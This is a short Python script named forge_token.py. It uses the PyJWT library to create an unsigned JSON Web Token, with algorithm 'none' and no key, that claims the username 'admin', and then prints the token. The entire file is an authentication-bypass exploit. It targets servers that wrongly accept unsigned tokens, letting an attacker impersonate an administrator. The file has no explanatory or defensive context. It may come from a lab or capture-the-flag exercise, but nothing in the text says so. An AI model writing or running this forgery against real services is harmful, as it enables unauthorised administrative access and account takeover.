# forge_token.py
import jwt

payload = {"username": "admin"}
forged_token = jwt.encode(payload, key=None, algorithm="none")
print(forged_token)
